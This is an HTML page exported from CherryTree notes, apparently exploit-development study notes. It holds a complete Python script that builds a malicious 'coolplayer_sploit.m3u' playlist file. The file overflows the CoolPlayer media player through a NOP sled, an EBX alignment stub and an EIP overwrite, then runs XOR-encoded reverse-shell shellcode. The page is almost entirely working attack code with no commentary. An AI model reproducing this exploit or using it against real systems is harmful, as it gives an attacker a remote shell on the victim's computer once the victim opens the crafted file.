<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XOR revshell (DYNAMIC)(520 bytes)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">XOR revshell (DYNAMIC)(520 bytes)</h1><br/><div class="codebox"><div class="codebox"><span style="color:#333333;font-weight:400">import</span>&nbsp;sys,struct<br /><br />filename&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"coolplayer_sploit.m3u"</span><br /><br />shellcode&nbsp;=&nbsp;(<br /><span style="color:#3ad900;font-weight:400">"\xeb\x15\x5e\x31\xc9\x66\xb9\x09\x02\x8a\x1e\x8a\x56\x01\x30\xd3"</span><br /><span style="color:#3ad900;font-weight:400">"\x88\x1e\x46\xe2\xf4\xeb\x05\xe8\xe6\xff\xff\xff\x2e\x1f\xd6\x55"</span><br /><span style="color:#3ad900;font-weight:400">"\xbc\x38\xd0\x2f\xd0\x2f\xd0\x10\x4e\xcf\xb9\xb7\xf4\xb5\x02\xb3"</span><br /><span style="color:#3ad900;font-weight:400">"\x30\xde\x22\xc0\x34\x46\xce\x1d\x27\x25\x54\x68\x99\xd6\x1c\xdb"</span><br /><span style="color:#3ad900;font-weight:400">"\x7e\x90\x47\x5d\x67\x6c\x3d\x01\xe9\x96\xd6\xaa\x90\x88\xb1\x07"</span><br /><span style="color:#3ad900;font-weight:400">"\x7d\xb5\x87\x10\xa0\x2d\x5d\x38\xcb\x25\x65\x1a\x2a\x51\x57\x85"</span><br /><span style="color:#3ad900;font-weight:400">"\x40\x53\x67\x24\x14\x2f\x6a\xaf\x71\x51\x51\x93\xc9\x0b\x32\x8d"</span><br /><span style="color:#3ad900;font-weight:400">"\x58\x7f\x4c\x9e\x5a\xfb\x31\xf5\x58\x1a\x95\xa9\x0c\xd9\x99\xe4"</span><br /><span style="color:#3ad900;font-weight:400">"\x64\xe7\xf6\xc2\x9f\xc4\x08\x8b\x1e\xd4\x83\xbd\xc3\xe8\xda\x2c"</span><br /><span style="color:#3ad900;font-weight:400">"\xdf\xde\xf9\xc7\x32\x55\x16\xc9\x17\x37\x13\xd7\x0e\x39\x1d\xfa"</span><br /><span style="color:#3ad900;font-weight:400">"\x39\x12\x10\xd5\x01\x23\xef\x5c\xc9\xda\xca\x82\xe1\x21\xa4\x03"</span><br /><span style="color:#3ad900;font-weight:400">"\x3b\x3e\x7b\xfd\x85\xae\x8a\x4e\x8c\x8e\x47\xbc\x29\x69\x40\xa7"</span><br /><span style="color:#3ad900;font-weight:400">"\x64\x48\x6a\xb5\x41\x7a\x52\x91\xad\xe2\x87\x61\x87\x3b\x6c\x58"</span><br /><span style="color:#3ad900;font-weight:400">"\x2d\x62\xaa\x5b\xe2\x90\x18\xfe\x27\x05\x36\xf8\x08\x23\x2e\xf0"</span><br /><span style="color:#3ad900;font-weight:400">"\x23\x12\x3b\xc0\x1e\x3c\x19\x23\x9e\xf9\xe9\x09\x47\x12\xd0\xa3"</span><br /><span style="color:#3ad900;font-weight:400">"\x1e\x6c\xe4\x3b\xe6\xc9\xc9\x3f\xe8\x22\x2f\xbc\x0f\x24\x56\xd3"</span><br /><span style="color:#3ad900;font-weight:400">"\x4c\x6b\x42\x82\x40\x31\x2f\x15\xa8\xcf\xdf\x97\xf6\x36\xb3\x0c"</span><br /><span style="color:#3ad900;font-weight:400">"\x34\xb0\xc0\xbe\x67\x51\x60\x96\x66\x43\x8b\x70\xe5\xa4\x8d\x4e"</span><br /><span style="color:#3ad900;font-weight:400">"\x9e\xaf\x9a\x45\xa3\xb3\xb3\x57\x6b\x24\x41\xa7\x46\xfa\xad\x99"</span><br /><span style="color:#3ad900;font-weight:400">"\xec\xa3\x6b\x9a\x27\x55\xdd\x02\xc7\xc5\xc6\x33\xe4\x2e\x23\xb0"</span><br /><span style="color:#3ad900;font-weight:400">"\x03\x28\x06\xd2\x08\x2e\x07\xe7\x05\x07\x15\x2f\x92\xf5\xe5\x05"</span><br /><span style="color:#3ad900;font-weight:400">"\x4b\x1e\xdc\xaf\x12\xd8\xdf\x78\xf8\x72\x5b\x8f\x4a\x48\x48\x99"</span><br /><span style="color:#3ad900;font-weight:400">"\xa1\xae\xcb\x7e\xa7\x8b\xa4\x7d\xa9\x82\x94\x70\x80\x80\x4c\xf7"</span><br /><span style="color:#3ad900;font-weight:400">"\x62\x70\x66\x2e\x89\x49\xcc\x77\x4f\x4a\x1f\x99\xe1\xf3\xd4\xda"</span><br /><span style="color:#3ad900;font-weight:400">"\xfb\xb9\xd1\xaa\x96\xd9\xbc\x3a\x50\x75\x8f\x3a\x89\x9b\x89\xc1"</span><br /><span style="color:#3ad900;font-weight:400">"\x26\x69\x19\x67\x87\x95\x85\x83\x34\x26\xe4\xba\x0e\x1c\x1c\xfa"</span><br /><span style="color:#3ad900;font-weight:400">"\xb4\xa1\xf0\xd0\x50\xda\xca\x2c\xcc\xde\x59\xea\x7f\x3e\x19\x69"</span><br /><span style="color:#3ad900;font-weight:400">"\x9c\xfb\xb8\x14\x9c\x18\x1d\x8e\x3b\xb8\x51\x1a\xa5\xd7\x5f\x65"</span><br /><span style="color:#3ad900;font-weight:400">"\xc8\xaf\xbf\x59\xb9\xab\x5b\xfc\x1c\x0c\x1a\x52\xb5\xe2\x92\xec"</span><br /><span style="color:#3ad900;font-weight:400">"\x64\xef\xdb\x85\x05\x8f\x4d\x16\xb7\x79\x2c\xbf\x59\x4d\x5b\xbd"</span><br /><span style="color:#3ad900;font-weight:400">"\x6a\x78\x5f\xb9\xb9\x05\x05\xe3\x63\xe9\xf9\x1f\xff\xed\xfd\x1b"</span><br /><span style="color:#3ad900;font-weight:400">"\xfb\xe9\xf9\x1f\x1f\x18\x08\x32\x8f\xe8\x98\xfd\x24\x02\x3b\xe9"</span><br /><span style="color:#3ad900;font-weight:400">"\x19\xd2\xc7\x54\xe6\xcd\xef\x35\xe0\x8d\x41\xe2\x77\x67\x77\xf1"</span><br /><span style="color:#3ad900;font-weight:400">"\x89\x9b\x8b\x6d\x9d\x8f\xff\x81\x61\x73\x60\x86\xc8\xdd\x98\x7f"</span><br /><span style="color:#3ad900;font-weight:400">"\x31\x24\x6d\xda\x6b"</span><br />)<br /><br /><br />maxlen&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">5000</span><br />crash_eip&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">240</span><br /><br />nop&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x90"</span>&nbsp;*&nbsp;<span style="color:#ff0044;font-weight:400">16</span><br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Align&nbsp;EBX</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;EBX&nbsp;=&nbsp;0x0057a470,&nbsp;buffer&nbsp;=&nbsp;0x0057a564,&nbsp;buffer&nbsp;-&nbsp;EBX&nbsp;=&nbsp;0xf4&nbsp;offset</span><br />align_ebx&nbsp;=&nbsp;(&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x66\x81\xc3\x01\x01"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;ADD&nbsp;BX,&nbsp;0x101</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xff\xe3"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;JMP&nbsp;EBX</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)<br /><br />prefix&nbsp;=&nbsp;nop<br />prefix&nbsp;+=&nbsp;align_ebx<br />prefix&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;(crash_eip&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(prefix))<br />eip&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"&lt;L"</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0048215b</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;CALL&nbsp;EBX</span><br />suffix&nbsp;=&nbsp;nop<br />suffix&nbsp;+=&nbsp;shellcode<br />suffix&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>&nbsp;*&nbsp;(maxlen&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(prefix&nbsp;+&nbsp;eip&nbsp;+&nbsp;suffix))<br /><br />payload&nbsp;=&nbsp;prefix&nbsp;+&nbsp;eip&nbsp;+&nbsp;suffix<br /><br />f&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(filename,&nbsp;<span style="color:#3ad900;font-weight:400">'wb'</span>)<br />f.write(payload)<br />f.close()<br /></div></div></div></body></html>